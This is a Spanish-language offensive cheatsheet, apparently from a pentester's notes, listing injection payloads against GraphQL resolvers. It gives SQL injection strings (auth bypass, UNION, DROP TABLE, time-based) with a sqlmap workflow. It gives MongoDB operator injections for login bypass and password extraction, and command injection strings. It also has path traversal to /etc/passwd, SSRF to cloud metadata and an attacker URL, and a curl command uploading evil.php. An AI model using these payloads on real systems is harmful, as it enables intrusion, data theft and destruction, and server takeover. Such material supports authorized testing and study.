---
aliases:
  - GraphQL SQLi
  - GraphQL NoSQLi
  - GraphQL SSRF
  - GraphQL Command Injection
tags:
  - type/cheatsheet
  - vuln/graphql
  - vuln/sqli
  - vuln/nosqli
  - vuln/ssrf
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[GraphQL Injection]]'
  - '[[SQL Injection (SQLi)]]'
  - '[[NoSQL Injection]]'
  - '[[Server-Side Request Forgery (SSRF)]]'
---
# GraphQL - Inyecciones via Resolvers

***

## SQLi en Args de Query / Mutation

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Resolver pasa argument GraphQL a query SQL sin parametrizar | Vector clásico — atacante controla string. |
| Auth bypass via username | `{"query":"query{user(username:\"admin' OR 1=1 -- -\"){id email}}"}` | Standard SQLi en arg. |
| Numeric arg SQLi | `{"query":"query{order(id: \"1 UNION SELECT 1,2,3 -- -\"){id}}"}` | Si id es String tipo. |
| Variable injection | `{"query":"query($u:String){user(username:$u){id}}", "variables":{"u":"admin' OR 1=1 -- -"}}` | Variables — más limpio. |
| Filter argument | `{"query":"query{users(where:\"role='admin' OR 1=1\"){id}}"}` | Si app expone filter raw. |
| Order/Sort SQLi | `{"query":"query{posts(orderBy:\"id);DROP TABLE users--\"){id}}"}` | Order by injection. |
| Limit SQLi | `{"query":"query{users(limit:\"10 UNION SELECT...\"){id}}"}` | Si limit es string. |
| Mutation SQLi | `{"query":"mutation{createUser(name:\"x',1)-- -\"){id}}"}` | INSERT injection. |
| GraphQL → SQL via JSON | `{"query":"query($f:JSON){items(filter:$f){id}}", "variables":{"f":{"role":"admin' OR '1'='1"}}}` | JSON scalar passes through. |
| Error-based SQLi | Provocar error con substring de DB content | Same as REST SQLi. |
| Time-based blind | `' OR SLEEP(5) -- -` | Timing observable. |
| sqlmap on GraphQL | Save raw request → `sqlmap -r req.txt` | Funciona si format consistente. |
^graphql-inj-sqli

### Workflow sqlmap GraphQL

```bash
# 1. Capturar request en Burp con argumento controlable
# 2. Save as graphql.req
# 3. Marcar el field con * sqlmap injecto ahí

# Ejemplo req.txt:
# POST /graphql HTTP/1.1
# Host: target
# Content-Type: application/json
# Cookie: session=...
# 
# {"query":"query{user(username:\"*\"){id email}}"}

sqlmap -r graphql.req --batch --risk 3 --level 5
```

___

## NoSQLi en Resolvers MongoDB

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Resolver Mongoose pasa GraphQL args directos a `.find()` con operators | Mongo operator injection. |
| Auth bypass | `{"query":"query{user(filter:{username:{\"$ne\":null},password:{\"$ne\":null}}){id}}"}` | Bypass login. |
| Regex extraction | `{"query":"query{user(filter:{password:{\"$regex\":\"^a.*\"}}){id}}"}` | Char-by-char extraction. |
| `$where` JS injection | `{"query":"query{user(filter:{$where:\"this.password=='admin'\"}){id}}"}` | JavaScript eval en MongoDB. |
| Combinar con introspection | Discover field types → identificar dónde van filters MongoDB | Pre-explotación. |
| JSON scalar como filter | `{"variables":{"filter":{"$ne":null}}}` | Variables hacen el job. |
| Mass query con `$in` | `{"$in":[1,2,3,...]}` | Bulk extraction. |
| Bypass via $not | `{"$not":{"$eq":"adminuser"}}` | Logic inversion. |
| Combine con regex^ extraction | Char-by-char con `^a`, `^b`, ... | Standard NoSQLi. |
| Mongoose strict mode | Si `strict:true` rejecta unknown fields | Más resistente. |
^graphql-inj-nosqli

___

## Command Injection / SSRF / Path Traversal

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Command injection en arg | `{"query":"query{ping(host:\"; id; #\"){result}}"}` | Si resolver llama `child_process.exec`. |
| Command injection con backticks | `{"query":"query{ping(host:\"`id`\"){result}}"}` | Shell expansion. |
| SSRF via URL field | `{"query":"query{fetch(url:\"http://127.0.0.1:6379/info\"){data}}"}` | Mutation que fetcha URL externa. |
| SSRF via image field | `{"query":"mutation{uploadAvatar(url:\"http://attacker/track\"){id}}"}` | Server fetcha image desde URL. |
| Path traversal en file field | `{"query":"query{readFile(path:\"../../../../etc/passwd\"){content}}"}` | Si app expone file read. |
| LFI con php://filter | `{"query":"query{readFile(path:\"php://filter/convert.base64-encode/resource=index.php\"){content}}"}` | PHP wrappers. |
| XXE en input XML field | Argument que es parseado como XML | Combo XXE + GraphQL. |
| Server-side template injection | Template field con SSTI payload | Combo. |
| JSON injection en filter | `{"filter":{"$ne":null,"_dummy":"\"$comment\":\"injected\""}}` | Con JSON scalar. |
| File upload via mutation | `{"query":"mutation($file:Upload!){upload(file:$file){id}}"}` con multipart | File upload via GraphQL spec. |
| Cloud metadata SSRF | `{"query":"query{fetch(url:\"http://169.254.169.254/latest/meta-data/\"){data}}"}` | AWS. |
^graphql-inj-cmdi-ssrf

### Multipart file upload (GraphQL spec)

```bash
# GraphQL multipart spec — para upload via mutations
curl -X POST https://target/graphql \
  -F operations='{"query":"mutation($file:Upload!){upload(file:$file){id}}", "variables":{"file":null}}' \
  -F map='{"0":["variables.file"]}' \
  -F 0=@evil.php
```

***
